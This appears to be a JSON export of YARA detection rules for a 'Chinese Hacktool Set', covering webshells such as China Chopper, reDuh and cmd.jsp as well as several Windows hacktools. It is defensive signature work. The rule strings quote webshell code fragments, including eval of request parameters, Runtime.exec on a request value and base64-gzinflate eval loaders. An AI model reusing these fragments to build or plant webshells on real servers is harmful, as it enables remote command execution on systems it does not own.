Webshell_templatr_RID2E0F : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file templatr.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:58:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(gzinflate(base64_decode('\" ascii\n   condition: \n      filesize < 70KB and all of them\n}","date":"2015-06-13 10:58:21","description":"Chinese Hacktool Set - file templatr.php","minimum_yara":"1.7","name":"Webshell_templatr_RID2E0F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2cfe692b5b0641931a272a133b5f4635","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Tools_JSP_cmd_RID2F96 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file cmd.jSp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:03:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(\\\"1752393\\\".equals(request.getParameter(\\\"Confpwd\\\"))){\" fullword ascii\n      $s1 = \"java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"Conn\\\"\" ascii\n      $s2 = \"<%@ page import=\\\"java.io.*\\\" %>\" fullword ascii\n      $s3 = \"out.print(\\\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\\\");\" fullword ascii\n      $s4 = \"while((a=in.read(b))!=-1){\" fullword ascii\n      $s5 = \"out.println(new String(b));\" fullword ascii\n      $s6 = \"out.print(\\\"</pre>\\\");\" fullword ascii\n      $s7 = \"out.print(\\\"<pre>\\\");\" fullword ascii\n      $s8 = \"int a = -1;\" fullword ascii\n      $s9 = \"byte[] b = new byte[2048];\" fullword ascii\n   condition: \n      filesize < 3KB and 7 of them\n}","date":"2015-06-13 12:03:31","description":"Chinese Hacktool Set - file cmd.jSp","minimum_yara":"1.7","name":"Webshell_Tools_JSP_cmd_RID2F96","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"27c22317a09e7438817750ace9bcea30","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_InjectionParameters_RID325D : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file InjectionParameters.vb\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:02:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Public Shared ReadOnly Empty As New InjectionParameters(-1, \\\"\\\")\" fullword ascii\n      $s1 = \"Public Class InjectionParameters\" fullword ascii\n   condition: \n      filesize < 13KB and all of them\n}","date":"2015-06-13 14:02:01","description":"Chinese Hacktool Set - file InjectionParameters.vb","minimum_yara":"1.7","name":"Webshell_InjectionParameters_RID325D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"26a053e1abd98fb72563cdd675624229","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Customize_4_RID2EFC : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file Customize.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:37:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex\" ascii\n      $s2 = \"c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr\" ascii\n      $s3 = \"Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create\" ascii\n      $s4 = \"R=\\\"Result\\\\t|\\\\t\\\\r\\\\nExecute Successfully!\\\\t|\\\\t\\\\r\\\\n\\\";}Conn.Close();break;\" ascii\n   condition: \n      filesize < 24KB and all of them\n}","date":"2015-06-13 11:37:51","description":"Chinese Hacktool Set - file Customize.aspx","minimum_yara":"1.7","name":"Webshell_Customize_4_RID2EFC","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"00e8c27ceb39d9d30d176fa274657d30","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_oracle_data_RID2F15 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file oracle_data.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:42:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$txt=fopen(\\\"oracle_info.txt\\\",\\\"w\\\");\" fullword ascii\n      $s1 = \"if(isset($_REQUEST['id']))\" fullword ascii\n      $s2 = \"$id=$_REQUEST['id'];\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-06-13 11:42:01","description":"Chinese Hacktool Set - file oracle_data.php","minimum_yara":"1.7","name":"Webshell_oracle_data_RID2F15","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"90271fb2dcfa3542e59b7adc063f61a3","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_reDuhServers_reDuh_RID31DF : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file reDuh.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:41:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"out.println(\\\"[Error]Unable to connect to reDuh.jsp main process on port \\\" +ser\" ascii\n      $s4 = \"System.out.println(\\\"IPC service failed to bind to \\\" + servicePort);\" fullword ascii\n      $s17 = \"System.out.println(\\\"Bound on \\\" + servicePort);\" fullword ascii\n      $s5 = \"outputFromSockets.add(\\\"[data]\\\"+target+\\\":\\\"+port+\\\":\\\"+sockNum+\\\":\\\"+new Strin\" ascii\n   condition: \n      filesize < 116KB and all of them\n}","date":"2015-06-13 13:41:01","description":"Chinese Hacktool Set - file reDuh.jsp","minimum_yara":"1.7","name":"Webshell_reDuhServers_reDuh_RID31DF","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"9b013a288dfe671ae7b7c07280f5cb55","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_item_old_RID2DF3 : CHINA DEMO HKTL T1100 T1105 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file item-old.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:53:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, T1105, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sCmd = \\\"wget -qc \\\".escapeshellarg($sURL).\\\" -O \\\".$sFile;\" fullword ascii\n      $s2 = \"$sCmd = \\\"convert \\\".$sFile.\\\" -flip -quality 80 \\\".$sFileOut;\" fullword ascii\n      $s3 = \"$sHash = md5($sURL);\" fullword ascii\n   condition: \n      filesize < 7KB and 2 of them\n}","date":"2015-06-13 10:53:41","description":"Chinese Hacktool Set - file item-old.php","minimum_yara":"1.7","name":"Webshell_item_old_RID2DF3","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"a86155d0a85add9fe9be4f68e1247a8b","score":60,"tags":["T1100","HKTL","DEMO","WEBSHELL","CHINA","T1105"]},{"author":"Florian Roth","content":"rule Webshell_Tools_2014_RID2DDD : CHINA DEMO HKTL T1007 T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file 2014.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:50:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1007, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"((Invoker) ins.get(\\\"login\\\")).invoke(request, response,\" fullword ascii\n      $s4 = \"program = \\\"cmd.exe /c net start > \\\" + SHELL_DIR\" fullword ascii\n      $s5 = \": \\\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\\\")\" fullword ascii\n   condition: \n      filesize < 715KB and all of them\n}","date":"2015-06-13 10:50:01","description":"Chinese Hacktool Set - file 2014.jsp","minimum_yara":"1.7","name":"Webshell_Tools_2014_RID2DDD","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2f71c74b78406e0fbb4e804e3bff1f9c","score":60,"tags":["T1100","T1007","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_reDuhServers_reDuh_2_RID3270 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file reDuh.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:05:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"errorlog(\\\"FRONTEND: send_command '\\\".$data.\\\"' on port \\\".$port.\\\" returned \\\".\" ascii\n      $s2 = \"$msg = \\\"newData:\\\".$socketNumber.\\\":\\\".$targetHost.\\\":\\\".$targetPort.\\\":\\\".$seq\" ascii\n      $s3 = \"errorlog(\\\"BACKEND: *** Socket key is \\\".$sockkey);\" fullword ascii\n   condition: \n      filesize < 57KB and all of them\n}","date":"2015-06-13 14:05:11","description":"Chinese Hacktool Set - file reDuh.php","minimum_yara":"1.7","name":"Webshell_reDuhServers_reDuh_2_RID3270","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"8cb4ec6b7aba4bd99d7a582cab34e23c","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Customize_5_RID2EFD : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file Customize.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:38:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"while((l=br.readLine())!=null){sb.append(l+\\\"\\\\r\\\\n\\\");}}\" fullword ascii\n      $s2 = \"String Z=EC(request.getParameter(Pwd)+\\\"\\\",cs);String z1=EC(request.getParameter\" ascii\n   condition: \n      filesize < 30KB and all of them\n}","date":"2015-06-13 11:38:01","description":"Chinese Hacktool Set - file Customize.jsp","minimum_yara":"1.7","name":"Webshell_Customize_5_RID2EFD","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"332988e785373430636837524c1e80c7","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_CN_Tools_old_RID2F45 : CHINA DEMO HKTL T1100 T1105 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file old.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:50:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, T1105, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$sCmd = \\\"wget -qc \\\".escapeshellarg($sURL).\\\" -O \\\".$sFile;\" fullword ascii\n      $s1 = \"$sURL = \\\"http://\\\".$sServer.\\\"/\\\".$sFile;\" fullword ascii\n      $s2 = \"chmod(\\\"/\\\".substr($sHash, 0, 2), 0777);\" fullword ascii\n      $s3 = \"$sCmd = \\\"echo 123> \\\".$sFileOut;\" fullword ascii\n   condition: \n      filesize < 6KB and all of them\n}","date":"2015-06-13 11:50:01","description":"Chinese Hacktool Set - file old.php","minimum_yara":"1.7","name":"Webshell_CN_Tools_old_RID2F45","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"5ed4bdc5d6d5b3de84ecce1287423c37","score":60,"tags":["T1100","HKTL","DEMO","WEBSHELL","CHINA","T1105"]},{"author":"Florian Roth","content":"rule Webshell_item_301_RID2D48 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file item-301.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:25:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sURL = \\\"301:http://\\\".$sServer.\\\"/index.asp\\\";\" fullword ascii\n      $s2 = \"(gov)\\\\\\\\.(cn)$/i\\\", $aURL[\\\"host\\\"])\" ascii\n      $s3 = \"$aArg = explode(\\\" \\\", $sContent, 5);\" fullword ascii\n      $s4 = \"$sURL = $aArg[0];\" fullword ascii\n   condition: \n      filesize < 3KB and 3 of them\n}","date":"2015-06-13 10:25:11","description":"Chinese Hacktool Set - file item-301.php","minimum_yara":"1.7","name":"Webshell_item_301_RID2D48","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b4553ee100a90d0ea090a91400c80852","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_CN_Tools_item_RID2FB5 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file item.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:08:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sURL = \\\"http://\\\".$sServer.\\\"/\\\".$sWget;\" fullword ascii\n      $s2 = \"$sURL = \\\"301:http://\\\".$sServer.\\\"/\\\".$sWget;\" fullword ascii\n      $s3 = \"$sWget=\\\"index.asp\\\";\" fullword ascii\n      $s4 = \"$aURL += array(\\\"scheme\\\" => \\\"\\\", \\\"host\\\" => \\\"\\\", \\\"path\\\" => \\\"\\\");\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}","date":"2015-06-13 12:08:41","description":"Chinese Hacktool Set - file item.php","minimum_yara":"1.7","name":"Webshell_CN_Tools_item_RID2FB5","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"93704793e0011d3894f59c312864cf40","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_ChinaChopper_temp_RID316F : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file temp.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:22:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"o.run \\\"ff\\\",Server,Response,Request,Application,Session,Error\" fullword ascii\n      $s1 = \"Set o = Server.CreateObject(\\\"ScriptControl\\\")\" fullword ascii\n      $s2 = \"o.language = \\\"vbscript\\\"\" fullword ascii\n      $s3 = \"o.addcode(Request(\\\"SC\\\"))\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-13 13:22:21","description":"Chinese Hacktool Set - file temp.asp","minimum_yara":"1.7","name":"Webshell_ChinaChopper_temp_RID316F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"50d4e00b16beaf29f2af408e7b84f881","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Tools_2015_RID2DDE : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file 2015.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:50:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Configbis = new BufferedInputStream(httpUrl.getInputStream());\" fullword ascii\n      $s4 = \"System.out.println(Oute.toString());\" fullword ascii\n      $s5 = \"String ConfigFile = Outpath + \\\"/\\\" + request.getParameter(\\\"ConFile\\\");\" fullword ascii\n      $s8 = \"HttpURLConnection httpUrl = null;\" fullword ascii\n      $s19 = \"Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;\" fullword ascii\n   condition: \n      filesize < 7KB and all of them\n}","date":"2015-06-13 10:50:11","description":"Chinese Hacktool Set - file 2015.jsp","minimum_yara":"1.7","name":"Webshell_Tools_2015_RID2DDE","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e752709d4e82ba4a03537285858d1cd4","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_reDuhServers_reDuh_3_RID3271 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file reDuh.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:05:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Response.Write(\\\"[Error]Unable to connect to reDuh.jsp main process on port \\\" +\" ascii\n      $s2 = \"host = System.Net.Dns.Resolve(\\\"127.0.0.1\\\");\" fullword ascii\n      $s3 = \"rw.WriteLine(\\\"[newData]\\\" + targetHost + \\\":\\\" + targetPort + \\\":\\\" + socketNum\" ascii\n      $s4 = \"Response.Write(\\\"Error: Bad port or host or socketnumber for creating new socket\" ascii\n   condition: \n      filesize < 40KB and all of them\n}","date":"2015-06-13 14:05:21","description":"Chinese Hacktool Set - file reDuh.aspx","minimum_yara":"1.7","name":"Webshell_reDuhServers_reDuh_3_RID3271","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"8d58a95adde8aaf74ba16b15bce45c43","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_ChinaChopper_temp_3_RID3201 : CHINA DEMO FILE HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file temp.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, FILE, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\\\"\" ascii\n      $s1 = \"\\\"],\\\"unsafe\\\");%>\" ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 150 and all of them\n}","date":"2015-06-13 13:46:41","description":"Chinese Hacktool Set - file temp.aspx","minimum_yara":"1.7","name":"Webshell_ChinaChopper_temp_3_RID3201","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e7f2bf33da8a1d7d5252f29a112bea50","score":60,"tags":["T1100","DEMO","WEBSHELL","FILE","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Pc_pc2015_RID29BE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pc2015.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 01:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\svchost.exe\" fullword ascii\n      $s1 = \"LON\\\\OD\\\\O-\\\\O)\\\\O%\\\\O!\\\\O=\\\\O9\\\\O5\\\\O1\\\\O\" fullword ascii\n      $s8 = \"%s%08x.001\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 309KB and all of them\n}","date":"2015-06-13 01:01:41","description":"Chinese Hacktool Set - file pc2015.exe","minimum_yara":"1.7","name":"Pc_pc2015_RID29BE","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"5651cbb54fda28dab576e2de3b614255","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_1_RID28C7 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file 1.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 18:10:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/churrasco/-->Usage: Churrasco.exe \\\"command to run\\\"\" fullword ascii\n      $s2 = \"/churrasco/-->Done, command should have ran as SYSTEM!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-06-13 18:10:01","description":"Chinese Hacktool Set - file 1.exe","minimum_yara":"1.7","name":"Dos_1_RID28C7","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d0725a81879d3308ac7518179bfd1f0b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Cmdshell32_RID2AA2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Cmdshell32_RID2AA2.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmdshell.exe\" fullword wide\n      $s2 = \"cmdshell\" fullword ascii\n      $s3 = \"[Root@CmdShell ~]#\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 62KB and all of them\n}","date":"2015-06-13 07:21:41","description":"Chinese Hacktool Set - file Cmdshell32.exe","minimum_yara":"1.7","name":"Cmdshell32_RID2AA2","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"f5fa9d17853739cc4f6e74041ea4e4f8","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_Down32_RID2A93 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Down32.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n      $s6 = \"down.exe\" fullword wide\n      $s15 = \"get_Form1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 137KB and all of them\n}","date":"2015-06-13 06:56:41","description":"Chinese Hacktool Set - file Down32.exe","minimum_yara":"1.7","name":"Dos_Down32_RID2A93","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"736febecdb790c495ceb24d188b0750a","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule dat_report_RID2B45 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file report.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<a href=\\\"http://www.xfocus.net\\\">X-Scan</a>\" fullword ascii\n      $s2 = \"REPORT-ANALYSIS-OF-HOST\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 480KB and all of them\n}","date":"2015-06-13 08:59:21","description":"Chinese Hacktool Set - file report.dll","minimum_yara":"1.7","name":"dat_report_RID2B45","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"77f62cd039a24bd4baec30cfee4c71d0","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule SwitchSniffer_RID2C50 : CHINA DEMO EXE FILE HKTL T1040 {\n   meta:\n      description = \"Chinese Hacktool Set - file SwitchSniffer_RID2C50.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NextSecurity.NET\" fullword wide\n      $s2 = \"SwitchSniffer_RID2C50 Setup\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}","date":"2015-06-13 09:43:51","description":"Chinese Hacktool Set - file SwitchSniffer.exe","minimum_yara":"1.7","name":"SwitchSniffer_RID2C50","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e315b09aa94a1e4210b172db191f10a1","score":70,"tags":["T1040","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule hscan_gui_RID2AC2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscan-gui.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:15:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Hscan.EXE\" fullword wide\n      $s1 = \"RestTool.EXE\" fullword ascii\n      $s3 = \"Hscan Application \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}","date":"2015-06-13 08:15:01","description":"Chinese Hacktool Set - file hscan-gui.exe","minimum_yara":"1.7","name":"hscan_gui_RID2AC2","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"0c7dddd1550b362413c4e8110c3a0b50","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule dat_xpf_RID29F7 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xpf.sys\"\n      author = \"Florian Roth\"\n      reference = 